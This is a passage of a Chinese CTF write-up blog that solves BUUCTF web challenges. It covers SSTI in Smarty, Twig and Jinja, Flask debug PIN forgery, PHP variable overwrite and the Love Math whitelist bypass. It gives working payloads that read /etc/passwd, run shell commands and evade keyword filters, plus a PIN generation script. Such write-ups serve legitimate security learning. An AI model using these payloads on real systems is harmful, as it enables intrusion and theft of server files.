<p>当我们分别去点击这些链接的时候发现url结构都相同：</p>
<p>{ % asset_img 174339.png %}</p>
<p>那么我们可以猜到我们想要的payload应该是&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;md5(cookie_secret+md5(“&#x2F;fllllllllllllag”))</p>
<p>所以问题的关键是这个cookie_secret，去百度了一下，发现了一篇现成的文章：</p>
<p><a target="_blank" rel="noopener" href="http://www.manongjc.com/detail/25-hjhhgdoihywitdw.html">http://www.manongjc.com/detail/25-hjhhgdoihywitdw.html</a></p>
<img src="/2023/08/03/buuctf/174845.png" class="">

<p>其实这里的**&#x2F;error?msg&#x3D;**我们点击链接的时候随便破坏一下就可以得到&#x2F;error?msg&#x3D;Error，然后成功得到cookie_secret:</p>
<img src="/2023/08/03/buuctf/175722.png" class="">

<p>最后进行md5加密后即可得到filehash</p>
<h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p>源码中有“The mystery of ip”,主页左上角有Flag菜单选项，点击后发现会显示自己的ip，Hint菜单的源码中提示“Do you know why i know your ip?”，联想到X-Forward-For，抓包传参：</p>
<img src="/2023/08/03/buuctf/172033.png" class="">

<p>果然我们可以控制XFF,然后不知道干什么，看别人wp发现是smart模板注入，我们直接传参：</p>
<pre><code>&#123;system(&quot;ls&quot;)&#125;
&#123;system(&quot;cat /flag&quot;)&#125;
</code></pre>
<h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p>这里的突破口是flag页面的用户登录</p>
<p>测试有模板注入漏洞</p>
<img src="/2023/08/03/buuctf/213113.png" class="">



<p>通过判断，是Twig注入，所以有固定的payload</p>
<pre><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("id")&#125;&#125;//查看id

&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;//查看flag
</code></pre>
<p>这道题不能直接在页面进行注入，要在cookie里面注入</p>
<img src="/2023/08/03/buuctf/214658.png" class="">

<h3 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h3><p>题目给的源码：</p>
<pre><code>import flask
import os
app = flask.Flask(__name__)
app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)
@app.route(&#39;/&#39;)
def index():
    return open(__file__).read()
@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)
def shrine(shrine):
    def safe_jinja(s):
        s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)
        blacklist = [&#39;config&#39;, &#39;self&#39;]
        return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s
    return flask.render_template_string(safe_jinja(shrine))
if __name__ == &#39;__main__&#39;:
    app.run(debug=True)
</code></pre>
<p>这题是flask模板注入</p>
<p>审计题目给的源码，在shrine路径下测试ssti能正常执行</p>
<p>接着分析源码，注册了一个名为FLAG的config，猜测这就是flag，如果没有过滤可以直接<code>&#123;&#123;config&#125;&#125;</code>或<code>&#123;&#123;self.*dict*&#125;&#125;</code>即可查看所有app.config内容，但是这题设了黑名单，把<code>[‘config’,‘self’]</code>设为None并且过滤了括号；当这些被过滤的时候，我们需要借助一些全局变量利用沙盒逃逸的方法，来调用被禁用的函数对象。</p>
<pre><code>current_app,这是全局变量代理（当前app），查看他的config即可
</code></pre>
<p>我们写payload:</p>
<pre><code>&#123;&#123;url_for.__globals__&#125;&#125;
</code></pre>
<img src="/2023/08/03/buuctf/161525.png" class="">

<p>然后：</p>
<pre><code>&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;
</code></pre>
<img src="/2023/08/03/buuctf/161827.png" class="">

<h3 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h3><p>题目模拟了一个获取IP的API，并且可以在最下方看到 “Build With Smarty !” 可以确定页面使用的是Smarty模板引擎。</p>
<p>在页面的右上角发现了IP，猜测这个IP受X-Forwarded-For头控制。</p>
<p>将XFF头改为 {6*7} 会发现该位置的值变为了42，便可以确定这里存在SSTI。</p>
<img src="/2023/08/03/buuctf/210001.png" class="">

<p>直接构造 {system(‘cat &#x2F;flag’)} 即可得到flag</p>
<h3 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h3><p>题目提示是flask</p>
<p>在加密内输入49 ，生成base64码e3s3Kjd9fcKg； 将e3s3Kjd9fcKg输入到解码框内，显示no no no说明存在防御</p>
<p>换一个输入14，base64码为e3s3Kzd9fQ&#x3D;&#x3D;，解码后，显示的是14，因此存在ssti</p>
<p>在解码页面随便输几个字符，看到报错信息，网站打开了flask的debug模式，在debug页面我们可以看到文件名，路径，源码和出错的方法名等信息</p>
<img src="/2023/08/03/buuctf/202344.png" class="">

<h5 id="预期解-利用PIN码进行RCE"><a href="#预期解-利用PIN码进行RCE" class="headerlink" title="预期解 利用PIN码进行RCE"></a>预期解 利用PIN码进行RCE</h5><p>经过测试，执行命令的ssti注入方法别过滤了，按照提示，应该想办法用pin码</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/32336971">https://zhuanlan.zhihu.com/p/32336971</a></p>
<p>pin码的生成需要下面这些东西：</p>
<pre><code>1、服务器运行flask所登录的用户名。 通过读取/etc/passwd获得
2、modname 一般不变就是flask.app
3、getattr(app, “name”, app.class.name)。python该值一般为Flask
值一般不变
4、flask库下app.py的绝对路径。通过报错信息就会泄露该值。
5、当前网络的mac地址的十进制数。通过文件/sys/class/net/eth0/address获得 //eth0处为当前使用的网卡
6、最后一个就是机器的id。 对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同。对于docker机则读取/proc/self/cgroup：
</code></pre>
<p>先读登录的用户名</p>
<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
</code></pre>
<img src="/2023/08/03/buuctf/214252.png" class="">

<p>其中的用户名是flaskweb</p>
<p>我们用上面的payload稍加改动，将其中读文件的部分改成&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address，就可以读取机器的MAC地址了</p>
<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('/sys/class/net/eth0/address','r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
</code></pre>
<img src="/2023/08/03/buuctf/214822.png" class="">

<p>将7e5fe8cec8a7转换为10进制为：138950392858791</p>
<p>按照其他师傅wp，题目是docker环境，因此读机器id需要读&#x2F;proc&#x2F;self&#x2F;cgroup，但搞了半天生成的pin不对，后面试了一下&#x2F;etc&#x2F;machine-id，没想到对了，想想应该是其他师傅正式比赛时时docker环境，而我在buu做的时候是linux环境</p>
<img src="/2023/08/03/buuctf/220612.png" class="">

<p>1408f836b0ca514d796cbf8960e45fa1</p>
<p>然后用巨佬写的exp生成pin码</p>
<pre><code>import hashlib
from itertools import chain
probably_public_bits = [
    &#39;flaskweb&#39;# username
    &#39;flask.app&#39;,# modname
    &#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))
    &#39;/usr/local/lib/python3.7/site-packages/flask/app.py&#39; # getattr(mod, &#39;__file__&#39;, None),
]
private_bits = [
    &#39;138950392858791&#39;,# str(uuid.getnode()),  /sys/class/net/ens33/address
    &#39;1408f836b0ca514d796cbf8960e45fa1&#39;# get_machine_id(), /etc/machine-id
]
h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode(&#39;utf-8&#39;)
    h.update(bit)
h.update(b&#39;cookiesalt&#39;)
cookie_name = &#39;__wzd&#39; + h.hexdigest()[:20]
num = None
if num is None:
    h.update(b&#39;pinsalt&#39;)
    num = (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]
rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num
print(rv)
//267-749-798
</code></pre>
<p>将生成的pin码传入，然后就可以在终端RCE了</p>
<img src="/2023/08/03/buuctf/230037.png" class="">

<h5 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h5><p>先读app.py</p>
<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py','r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
</code></pre>
<img src="/2023/08/03/buuctf/230934.png" class="">

<p>主要审计一下waf，过滤了import,flag,os,system,popen,eval等</p>
<p>不过可以使用字符串拼接绕过或字符串倒转</p>
<p>找目录</p>
<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['ev'+'al']('__im'+'port__'+'("o'+'s")'+'.pope'+'n'+'("ls /").read()')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
或
&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
</code></pre>
<p>再读flag</p>
<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['open']('/this_is_the_fl'+'ag.txt','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;

//字符串倒转
&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
</code></pre>
<h1 id="混杂"><a href="#混杂" class="headerlink" title="混杂"></a>混杂</h1><h3 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h3><p>扫了一下目录发现有.git，应该是git文件泄露，用githack扫一下：</p>
<img src="/2023/08/03/buuctf/204241.png" class="">

<p>能扫到index.php和flag.php，但down不下来，可能是靶机的原因，在网上找一下</p>
<pre><code>&lt;?php
include &#39;flag.php&#39;;
print_r($flag);
$yds = &quot;dog&quot;;
$is = &quot;cat&quot;;
$handsome = &#39;yds&#39;;
foreach($_POST as $x =&gt; $y)&#123;  // $键 = $值的值
    $$x = $y;  
    
&#125;
foreach($_GET as $x =&gt; $y)&#123;
    $$x = $$y;// $handsome = flag的值  ---&gt;   $handsome = $flag  --&gt; $x=handsome &amp; $y=flag
&#125;
 // 需要不满足以下几个条件
foreach($_GET as $x =&gt; $y)&#123;
    if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;)&#123;  //不能同时 flag的值等于某个键名，那个键值又是flag
        exit($handsome);
    &#125;
&#125;
if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;// 不能同时  GET 和 POST 都没设置 flag
    exit($yds);
&#125;
if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;)&#123;// 任意都不能满足 flag === &#39;flag&#39;
    exit($is);
&#125;
echo &quot;the flag is: &quot;.$flag;
</code></pre>
<p>看了一下wp，在三个判断中有三种变量覆盖解法：</p>
<p>1、利用handsome</p>
<pre><code>?handsome=flag&amp;flag=dd&amp;dd=xxx
</code></pre>
<p>2、利用yds</p>
<pre><code>?yds=flag
</code></pre>
<p>3、利用is</p>
<pre><code>?is=flag&amp;flag=flag
</code></pre>
<h3 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h3><p>查看源代码：</p>
<img src="/2023/08/03/buuctf/213947.png" class="">

<p>直接可以进入flag.php:</p>
<img src="/2023/08/03/buuctf/214134.png" class="">

<p>通过这两句话的提示，我们尝试在请求包中加入X-Forwarded-For: 127.0.0.1</p>
<p>最后成功获得flag</p>
<h3 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h3><p>输入前三个商品的价格：</p>
<img src="/2023/08/03/buuctf/223742.png" class="">

<p>输入最后一个商品：</p>
<img src="/2023/08/03/buuctf/223958.png" class="">

<p>告诉了我们只能使用一个字符，一个字符能够购买的就只有前三只独角兽，虽然我也没有购买成功hhh</p>
<p>所以猜测只要购买了第四只独角兽，就能获取flag</p>
<p>于是我们需要找到单个字符utf-8解码后比1337大的数字</p>
<p>这里有其他师傅给的网站：</p>
<p><a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode">https://www.compart.com/en/unicode</a></p>
<p>搜索：<code>thousand</code>，选择一个<strong>Numeric Value</strong>大于<code>1337</code>的字符：</p>
<img src="/2023/08/03/buuctf/225226.png" class="">

<img src="/2023/08/03/buuctf/225417.png" class="">

<p>将<code>0xE2 ox86 ox88</code>的0x换成%然后传参即可成功获得flag</p>
<p>这道题其实可以直接传”万”字通过</p>
<h3 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h3><pre><code>&lt;?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET[&#39;c&#39;]))&#123;
    show_source(__FILE__);
&#125;else&#123;
    //例子 c=20-1
    $content = $_GET[&#39;c&#39;];
    if (strlen($content) &gt;= 80) &#123;
        die(&quot;太长了不会算&quot;);
    &#125;
    $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];
    foreach ($blacklist as $blackitem) &#123;
        if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) &#123;
            die(&quot;请不要输入奇奇怪怪的字符&quot;);
        &#125;
    &#125;
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];
    preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) &#123;
        if (!in_array($func, $whitelist)) &#123;
            die(&quot;请不要输入奇奇怪怪的函数&quot;);
        &#125;
    &#125;
    //帮你算出答案
    eval(&#39;echo &#39;.$content.&#39;;&#39;);
&#125;
</code></pre>
<p>这道题有黑名单和白名单，屏蔽了很多东西</p>
<p>我们一般rce要构造出如下代码：</p>
<pre><code>?c=system(&quot;cat /flag&quot;)
</code></pre>
<p>但是system和引号没法绕过白名单，空格和引号没法通过黑名单</p>
<p>引号其实可以省略，system可以不用引号</p>
<p>这里有个知识点是php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘cat&#x2F;flag’)</p>
<pre><code>?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag
</code></pre>
<p>但是问题又来了，_GET不是白名单里的变量名，[]也被黑名单过滤</p>
<p>[]可以用{}绕过</p>
<p>_GET就要用到<strong>hex2bin() 函数</strong></p>
<p>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。</p>
<p>所以我们先把_GET转为16进制</p>
<p><code>5f 47 45 54</code></p>
<p>然后_GET&#x3D;hex2bin(5f 47 45 54)</p>
<p>但<code>hex2bin</code>也不是白名单里的函数，所以我们这里要用到**base_convert()**函数来进行转换</p>
<p>base_convert()函数能够在任意进制之间转换数字</p>
<p>这里的hex2bin可以看做是36进制，用base_convert来转换将一个10进制的数字转换为36进制就可以出现hex2bin</p>
<img src="/2023/08/03/buuctf/212700.png" class="">

<p>所以hex2bin&#x3D;base_convert(37907361743,10,36)</p>
<p><code>5f 47 45 54</code>也不能直接填，因为会被<code>preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);</code> 这句话当作函数名放进白名单里检测，所以只能全是数字才不会被正则匹配到，所以<code>5f 47 45 54</code>也需要经过进制转化，<strong>dechex()</strong> 函数把十进制数转换为十六进制数。</p>
<img src="/2023/08/03/buuctf/214249.png" class="">

<p>5f474554&#x3D;dechex(1598506324)</p>
<p>所以</p>
<pre><code>_GET=hex2bin(5f 47 45 54)=base_convert(37907361743,10,36)(dechex(1598506324))
</code></pre>
<p>将_GET存进一个变量里：</p>
<pre><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));
</code></pre>
<p>payload</p>
<pre><code>?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi&#123;pi&#125;)($$pi&#123;log&#125;)&amp;pi=system&amp;log=cat /flag
</code></pre>
<h3 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h3><p>题目给了一个账户：cookie<code>/</code>monster，登录抓包</p>
<img src="/2023/08/03/buuctf/223542.png" class="">

<p>发现设置了一个cookie：username&#x3D;cookie</p>
<p>接着携带cookie发包尝试获得flag</p>
<img src="/2023/08/03/buuctf/224021.png" class="">


      
       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
    </div>
</article>







    




    </div>
    <div class="copyright">
        <p class="footer-entry">
    ©2023-2026 Secfeng
</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
<a class="" id="rocket" ></a>

    </div>
</div>

</body>
<script src="/js/jquery.pjax.js?v=1.1.0" ></script>

<script src="/js/script.js?v=1.1.0" ></script>
<script>
    var img_resize = 'default';
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $("#post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        

        /*高亮代码块行号*/
        
        $('pre code').each(function(){
            var lines = $(this).text().trim().split('\n').length, widther='';
            if (lines>99) {
                widther = 'widther'
            }
            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
            $(this).addClass('has-numbering ' + widther)
                    .parent()
                    .append($numbering);
            for(var i=1;i<=lines;i++){
                $numbering.append($('<li/>').text(i));
            }
        });
        

        /*访问数量*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*打赏页面隐藏与展示*/
    

</script>

<!--加入行号的高亮代码块样式-->

<style>
    pre{
        position: relative;
        margin-bottom: 24px;
        border-radius: 10px;
        border: 1px solid #e2dede;
        background: #FFF;
        overflow: hidden;
    }
    code.has-numbering{
        margin-left: 30px;
    }
    code.has-numbering.widther{
        margin-left: 35px;
    }
    .pre-numbering{
        margin: 0;
        position: absolute;
        top: 0;
        left: 0;
        width: 20px;
        padding: 0.5em 3px 0.7em 5px;
        border-right: 1px solid #C3CCD0;
        text-align: right;
        color: #AAA;
        background-color: ;
    }
    .pre-numbering.widther {
        width: 35px;
    }
</style>

<!--自定义样式设置-->
<style>
    
    
    .nav {
        width: 542px;
    }
    .nav.fullscreen {
        margin-left: -542px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*列表样式*/
    

    /* 背景图样式 */
    
    


    /*引用块样式*/
    

    /*文章列表背景图*/
    

    
</style>







</html>
